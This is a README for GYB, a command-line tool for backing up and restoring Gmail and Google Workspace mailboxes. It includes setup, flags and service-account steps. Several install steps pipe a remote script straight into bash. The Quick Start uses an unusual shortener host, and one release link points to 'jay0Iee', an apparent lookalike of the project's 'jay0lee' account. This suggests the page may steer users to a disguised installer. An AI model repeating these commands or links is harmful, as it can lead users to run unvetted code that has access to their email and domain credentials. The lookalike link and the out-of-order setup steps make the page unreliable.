GYB
============================
Got Your Back (GYB) is a command line tool for backing up your Gmail messages to your local computer. It uses Gmail's API over HTTPS.

[![Build Status](https://travis-ci.org/jay0lee/got-your-back.svg?branch=master)](https://travis-ci.org/jay0lee/got-your-back)
## Quick Start
### Linux / MacOS
Open a terminal and run:
```
bash <(curl -s -S -L https://gyb-shortn.jaylee.us/gyb-install)
```
this will download GYB, install it and start setup.
### Windows
Download the MSI Installer from the [GitHub Releases] page. Install the MSI and you'll be prompted to setup GYB.

## Downloads
You can download the current GYB release from the [GitHub Releases] page.

## Mailing List / Discussion group
The GYB mailing list / discussion group is hosted on [Google Groups].  You can join the list and interact via email, or just post from the web itself.

## Author
GYB is maintained by <a href="mailto:jay0lee@gmail.com">Jay Lee</a>. Please direct "how do I?" questions to [Google Groups].

[GitHub Releases]: https://github.com/jay0lee/got-your-back/releases
[GitHub]: https://github.com/jay0lee/got-your-back/tree/master
[GitHub Wiki]: https://github.com/jay0lee/got-your-back/wiki
[Google Groups]: http://groups.google.com/group/got-your-back

## Documentation

- [Introduction](#Introduction)
- [Install GYB Quickly](#install-gyb-quickly)
  - [Windows Users](#windows-users)
  - [Mac and Linux Users](#mac-and-linux-users)
- [Install GYB Not as Quickly](#install-gyb-not-as-quickly)
  - [Windows Users](#windows-users-1)
  - [Mac and Linux Users](#mac-and-linux-users-1)
  - [Running GYB for the first time](#running-gyb-for-the-first-time)
    - [Windows Users](#windows-users-2)
    - [Mac and Linux Users](#mac-and-linux-users-2)
- [Upgrading GYB](#upgrading-gyb)
  - [Windows Users](#windows-users-3)
  - [Mac and Linux Users](#mac-and-linux-users-3)
- [Performing a backup](#performing-a-backup)
- [Performing a restore](#performing-a-restore)
- [Selective Backups With Gmail Search](#selective-backups-with-gmail-searching)
- [Advanced Options](#advanced-options)
- [Google Workspace Admins](#google-workspace-admins)
  - [--action restore-group](#--action-restore-group)
  - [--use-admin](#--use-admin)
  - [--service-account](#--service-account)
  - [--vault](#--vault)
- [Troubleshooting](#troubleshooting)

## Introduction

Got Your Back (GYB) is a command line tool that backs up and restores your Gmail account. This page provides simple instructions for downloading, installing and starting to use GYB.

GYB works with Gmail.com and Google Workspace (formerly G Suite / Google Apps) accounts.

## Install GYB Quickly

### Windows Users

The Installer can be downloaded here --> [https://github.com/GAM-team/got-your-back/releases/Setup.msi](https://github.com/GAM-team/got-your-back/releases). Install the MSI and you'll be prompted to setup GYB.

### Mac and Linux Users

Open a terminal and run:

`bash <(curl -s -S -L https://git.io/gyb-install)`

this will download GYB, install it and start setup.

## Install GYB Not as Quickly
### Mac and Linux Users
#### TAR Install
Head to the [releases](https://github.com/jay0Iee/got-your-back/releases/tag/482d175) page and download the latest tar.xz source version of GYB.

Use the archive extraction tool of your choice to extract the files from the GYB .tar.xz file you downloaded. I suggest extracting the files to a sub-folder of your home directory.

### Running GYB for the First Time
#### Windows Users
Open a command prompt on your computer. You can do this by going to Start -> Programs -> Accessories -> Command Prompt or by opening the Run... dialog on the start menu and typing CMD then enter. Now change to the directory where you extracted GYB. The command to change directories looks like:

```
cd %USERPROFILE%\Downloads\gyb-1.38-windows-x86_64\gyb
```

this works if you extracted GYB to C:\Users\{username}\Downloads\gyb-1.38-windows-x86_64\gyb. If you extracted it elsewhere, specify that location instead. 

### Mac and Linux Users
Open up a terminal window on your computer. On Linux, this is generally under Accessories -> Terminal. On Mac, it's under Applications -> Utilities -> Terminal. Now change to the directory where you extracted GYB. Try:

```
cd ~/gyb
```

this will work if you extracted the GYB files to a subfolder named gyb in your home directory. If you extracted them elsewhere, replace ~/gyb with the full path to them. 

Instead of needing to type the full path to gyb ("/home/{user}/gyb") for every command, you can set the gyb file as an alias to shorten it to just "gyb":

```
echo "alias gyb='~/gyb/gyb'" >> ~/.bash_aliases
```

#### General

Now type:

```
gyb --action create-project --email youremail@gmail.com
```

**Mac and Linux Users**: If you get an error about python not being a valid program, make sure you have the Python 3 interpreter installed on your machine. All Macs and most Linux installs should include Python 3 but if not, you may need to research how to install it on your OS/Distribution.

Then follow the instructions. They'll help you create a Google Cloud project.

**Important note**: If you don't use Google Workspace, Google forces your project to be "External" i.e. **Public**.
The project is in a test mode by default though, so your alternatives are:
1. Add your e-mail address to the test (under the option of "Users").
1. Publish the project so everyone can use it. You probably would want to avoid that option.

##### OAuth Consent
The instructions will ask you to supply **Client ID** and **Client Secret** without telling you how to find them though, so here's how:

Once you've completed that flow, you will find yourself at the 'APIs & Services' Dashboard. Select 'Credentials', and '+ CREATE CREDENTIAL'. Now you can follow the instructions from GYB's prompt.

##### Verification

You'll need to register your app inside your Google account.

Any regular command will do it, but if you don't want to immediately backup/restore, you can use a passive verification command:

```
gyb --email youremail@gmail.com --action estimate
```

except use your real email address in place of youremail@gmail.com. GYB will open up a web page in order for you to grant access to your Gmail account. This authorization makes it possible for GYB to connect to your Google Account for Gmail data only, GYB will have no rights to any of your other Google Data. Make sure you are logged in to the Google account you specified before granting access. Once you've granted access, switch back to the command prompt window and hit enter. If no errors are printed, GYB should start estimating the size of your Gmail mailbox. Note that GYB only estimates the size of messages in the All Mail folder, it does not check Spam or Trash although these do count against your Gmail quota displayed at the bottom of your Gmail inbox. To accurately compare GYB's estimate and the Gmail inbox web page quota display, first empty your Trash and Spam folders.

Congratulations, you're up and running with GYB! You probably want to move on to [performing a backup](https://github.com/jay0lee/got-your-back/wiki#step-4-performing-a-backup) now.

## Upgrading GYB
### Windows Users
To upgrade an existing GYB install in **Windows**, just copy and paste the new downloaded files to **overwrite** their older versions.

### Mac and Linux Users
In other operation systems, to upgrade an existing GYB install, run:

```
bash <(curl -s -S -L https://git.io/gyb-install) -l
```

The -l at the end tells the download script to upgrade to latest version and not perform the project setup steps. This will preserve your current settings and existing backups.

## Performing A Backup
A basic GYB backup is very easy to start. Just run:

```
gyb --email youremail@gmail.com --action backup
```

the "--action backup" is not strictly necessary since GYB defaults to backing up if an action is not specified. Assuming you've already granted GYB access to your Gmail messages, GYB will load the access token from youremail@gmail.com.cfg and use it to get access to your messages. By default, GYB will download and save all messages to a folder named "GYB-GMail-Backup-youremail@gmail.com". You can specify another folder for GYB to use with the --local-folder argument:

```
gyb --email youremail@gmail.com --local-folder "C:\Users\John\Documents\Johns_Gmail_Backup"
```

GYB will keep you update you as the backup progresses.

## Performing a Restore
Restores on GYB are also very simple:

```
gyb --email youremail@gmail.com --action restore --local-folder "c:\my_gmail_backup"
```

the specified folder should exist and should have been used in a previous GYB backup. If not specified, restores default to using the GYB-GMail-Backup-youremail@gmail.com folder just like the backup does. GYB will connect to your Gmail account and perform the restore of all messages in the backup folder.

Note that if you perform a restore to the same Gmail account, GYB will not create duplicate messages, instead you'll only see messages restored which were backed up by GYB then later deleted from the Gmail account.

If you want to restore messages to an account other than the one you backed up, it's necessary to specify the backup folder. As an example,

```
gyb --email newaddress@gmail.com --action restore --local-folder GYB-GMail-Backup-oldaddress@gmail.com
```

will look for messages in the backup of the `oldaddress@gmail.com` account but restore them to the `newaddress@gmail.com` account.

You can also use the `--label-restored <NEWLABELNAME>` argument to set a label on all restored messages. For example:

```
gyb --email newaddress@gmail.com --action restore --local-folder GYB-GMail-Backup-oldaddress@gmail.com --label-restored "Old Address"
```

will restore the message, always including an extra label of `Old Address` on the restored messages.

## Selective Backups With Gmail Searching
GYB supports selective backups using Gmail style mailbox searches. For example, suppose you wanted to only backup important or starred messages:

```
gyb --email youremail@gmail.com --search "is:important OR is:starred"
```

would cause GYB to only backup messages matching that search query. Virtually any Gmail search will work with GYB. The only exception being that specifying "in:anywhere" will not backup Trash and Spam, to backup Trash and Spam with GYB see the `--spam-trash` option below. [See here for a detailed article](http://mail.google.com/support/bin/answer.py?answer=7190) on all of the possible Gmail Search parameters.

Note that Gmail searches also work with the "--action estimate" command. Suppose you wanted to know how much space emails with .PDF attachments are using in your Gmail mailbox:

```
gyb --email youremail@gmail.com --action estimate --search "filename:PDF"
```

will estimate the size of messages with PDF attachments only. Try substituting DOC, JPG, ZIP and other common file attachments for PDF.

### Improving backup speed (incremental daily backups)

The `--search` option can be used to improve backup speed for daily backups. To avoid going through all your old email that doesn't change much and only backup new emails (and recently read/sorted emails), you can use a command like:

```
gyb --email youremail@gmail.com --search "newer_than:7d"
```

This faster backup can be used as a daily cron task, with a complete backup (without the search) as a weekly task.

## Advanced options

### --action backup

### --action check-service-account

### --action count
Just count the number of messages in a user mailbox. Note, to compare this number to what you see in Gmail, you should turn conversation mode off in general settings and search for "-is:chat". This ensures you are counting individual messages (not conversations) and that archived chats which are not backed up by GYB by default are not counted.

### --action create-project

### --action create-label

### --action delete-projects
delete-projects action requires --email and a project --search argument

### --action estimate

### --action print-labels

### --action purge
DANGEROUS!!! This option will completely delete messages. Running this command without a <code>--search</code> parameter will EMPTY YOUR ENTIRE MAILBOX. This removes messages from Trash and Spam folders also so there is no ability to restore from the mailbox itself. Use this option with extreme caution. You have been warned. It is highly recommended to do a backup before a purge.

### --action purge-labels
DANGEROUS!!! This option will delete all user labels for the mailbox. No messages will be deleted but everything will be left unlabeled!

### --action quota

### --action reindex

### --action restore

### --action restore-mbox
Restore mbox files, that you've exported from [Gmail Takeout](https://www.google.com/settings/takeout), [Google Vault](https://support.google.com/vault/answer/2462365), [GAM Email Audit Exports](https://github.com/jay0lee/GAM/wiki/ExamplesAccountAuditing#user-mailbox-exports) or any other MBOX format file you have, or EML files which are text raw data [downloaded from Gmail](https://support.google.com/mail/answer/29436), etc.

* [Before](https://github.com/GAM-team/got-your-back/commit/2849eb0d6cff036fd9e63c3fe19a9b493bec0b19) [v1.51](https://github.com/GAM-team/got-your-back/compare/v1.50...v1.52#diff-8b7bc6c9e0ee31d87be644e452b633563d0deb6ed5b396745de40996af830836), it only supported EML files if you renamed them to end with MBOX. For example, renaming `external.eml` to `external.eml.mbox` or even just `external.mbox` (but the latter probably causes to forget it's actually EML).

Use the --local-folder option to specify the path where you've extracted all of your mbox files. GYB will restore messages from all `.mbox`, `.mbx` and `.eml` files in the directory **and any sub-directories**.

### --action revoke
--action revoke does not work with --service-account

### --action split-mbox
split-mbox is no longer necessary and is deprecated. Mbox file size should not impact restore performance in this version.

### --batch-size
By default, GYB grabs the full content of 100 messages at a time for backup. If the mailbox has many very large messages, it may take a very long time for GYB to backup anything as it could be pulling down up to 5000 MB (100 messages x 50 MB each) of data for each batch. Try specifying something smaller like --batch-size 4. The batch size range is 1-100 as of version 0.44.

### --ca-file
Specify a certificate authority to use for validating HTTPS hosts.

### --debug
Turn on verbose debugging and connection information (troubleshooting)

### --fast-incremental
By default, GYB will refresh the stored labels and flags for messages that have already been backed up, just in case they changed after the backup. This step can be skipped by supplying the `--fast-incremental` switch on the command line.

### --fast-restore
DEPRECATED (do not use): --fast-restore (message insert) is no longer supported by GYB. See: [Gmail API Release Notes](https://developers.google.com/gmail/api/release-notes#12_november_2019_new_messageimport_implementation)
(using this method breaks Gmail deduplication and threading)

Perform a faster restore of messages. It's important to note that when performing a fast restore, restored messages will not be threaded into Gmail conversations nor will they be deduped. This makes viewing and managing the messages in the mailbox at a later time much more difficult.

### --help
Display help message.

### --label-restored
On restore, all messages will additionally receive this label. For example, `--label-restored gyb-restored` will label all uploaded messages with a `gyb-restored` label.

### --local-folder
On backup, restore, estimate, local folder to use. Default is `GYB-GMail-Backup-<email>`

### --label-prefix
Optional: On restore, all labels will additionally receive this prefix label. For example, `--label-prefix gyb-archive` will become main label of all uploaded labels with a `gyb-archive` label. 
ATTENTION - This is not compatible with `--strip-labels`
ATTENTION - This will also create one `INBOX` and `SENT` specific label

### --memory-limit
Limit in megabytes batch requests allow. Prevents memory issues.

### --noresume
GYB keeps a record of messages restored to each account and will pick up where it left off should the restore not finish. The <code>--noresume</code> switch will make GYB ignore messages already restored and restart the restore at the beginning.

### --search
Optional: On backup, estimate, count and purge, Gmail search to scope operation against.

### --short-version
Just print version and quit

### --spam-trash
Include messages in the Spam and Trash folders for backup, estimate and count actions. This allows these messages to be acted upon where normally they would be skipped.

### --strip-labels
On restore and restore-mbox, strip existing labels from messages except for those explicitly declared with the --label-restored parameter.

### --tls-min-version
Python 3.7+ only. Set minimum version of TLS HTTPS connections require. Default is TLSv1_2

### --tls-max-version
Python 3.7+ only. Set maximum version of TLS HTTPS connections use. Default is no max

### --version
Print GYB version and quit.

## Google Workspace Admins
If you're using Google Workspace, it's possible to use GYB with your users without needing to know their password. This works because GYB makes use of a special Google Workspace feature called domain-wide delegation with service accounts.

If you already have GAM setup you can leverage that existing oauth2service.json file. For Linux Users you can use the following command to symlink to the existing file.

```
ln -s $HOME/.gam/oauth2service.json $HOME/bin/gyb/oauth2service.json
```

If you are setting up GYB for the first time, there are a few steps involved with creating and authorizing a service account.


1. Go to the [Google Developers Console](https://console.developers.google.com/flows/enableapi?apiid=drive,gmail,groupsmigration)
1. Select Yes and click "Agree and continue". It will take a moment for the project to be created.
1. Click "Go to credentials"
1. Click "New credentials" and choose "Service account key".
1. Click "Select..." and choose "New service account".
1. Give your service account a name like "GYB Service account".
1. Keep JSON as key type. Click "Create".
1. Agree to create the service account without a role.
1. Open the file in a text editor and look for the line showing something like:

   `"client_id": "107634805914295539364",`

    in this example, 107634805914295539364 is your Client ID. Remember this value for later steps.
1. Your browser will download a .json file.  Save the file with a name of oauth2service.json and put it in the same folder as gyb.py or gyb.exe.
1. You have to give it a name, eg "GYB", and Save.
1. Go to [Domain-wide Delegation in your Google Workspace Admin console](https://admin.google.com/ac/owl/domainwidedelegation)
1. Click "Add New".
1. For Client ID, enter the Client ID from above.
1. For API Scopes, enter exactly:

   ```
   https://mail.google.com/,https://www.googleapis.com/auth/apps.groups.migration,https://www.googleapis.com/auth/drive.appdata
   ```
1. Click "Authorize".

Your service account setup is complete.

Now you can run GYB with the --service-account option. Try running:

```
gyb --email yourusersemail@yourcompany.com --service-account
```

WARNING: Service Accounts offer very powerful control over your Google Workspace domain. Do not use this option on a computer you do not trust! Do not leave the oauth2service.json file in places where others can find it! If you suspect your Service Account has been stolen, delete the API project in the API console and unauthorize its access to your domain in the Admin console.

### --action restore-group
Google Workspace only. This feature allows you to restore messages to a Google Group rather than a user mailbox. It's important to note that:
 * Message labels, read/unread status, stars and other metadata are not preserved with restore-group.
 * GYB can't extract messages stored in Google Groups; however, it's possible to export group's emails using Google Takeout. Google Takeout's group export features is available also for consumer accounts.

 * The Groups Migration API supports a maximum message size of 25mb so not all Gmail-stored messages can be imported into a group.
 * Groups have no quota! If you're okay with the above issues, you can offload an unlimited amount of data to a group. This may be a good solution for users approaching their Gmail quota.

This option requires both the --service-account and --use-admin option to be specified. The --email option should be the Google Group to restore messages into. Archiving for the group should be enabled.

A good use case for restore-group would be a user who is nearing Gmail quota. You could do a selective backup of the user's mailbox with a GYB backup using `--search before:2011/04/13 smaller:25M` to get only messages older than 2 years and smaller than 25mb. Then restore the messages to a Google Group and give the user exclusive access to the new group. Finally, free up the user's mailbox by performing a purge using the same search parameters. I'd also recommend holding on to the local backup of the user's mail should you ever wish to restore to the mailbox.

### --service-account
Use a Google Service Account to authenticate rather than standard 3-legged OAuth authentication. This option is only for Google Workspace admins.

### --use-admin
Specify the Google Workspace admin to utilize when restoring messages to a group with --action restore-group. This user should be a super administrator, delegated admins do not have sufficient privileges to perform group restores.

### --vault
On restore and --fast-restore, skips adding restored messages to the user's visible Gmail mailbox and only lets the messages be visible to [Google Vault](https://workspace.google.com/products/vault/). This option is meant mostly for Google Workspace Administrators who wish to have the restored messages be a part of the user's Vault discovery but not their visible mailbox.

## Troubleshooting

Below you'll find some possible errors and what they could mean.

### access_denied

This can occur if you've failed to add the proper API scopes (mail, groups migration) for a service account.

### invalid_request

This can occur if you're attempting to download mail from an account that is suspended; only active accounts can be backed up via Got Your Back. Unless you are using a `--service-account` as they have access to backup from suspended accounts.

### invalid_grant
If you get a message like `ERROR: ('invalid_grant: Bad Request', '{ "error": "invalid_grant", "error_description": "Bad Request"}')` then try to **delete** your `[address.cfg]` file first 

### sqlite3.IntegrityError: datatype mismatch

If you get this when trying to use `gyb --email [address] --action restore-mbox --local-folder [folder]` then try **delete** your local folder first.
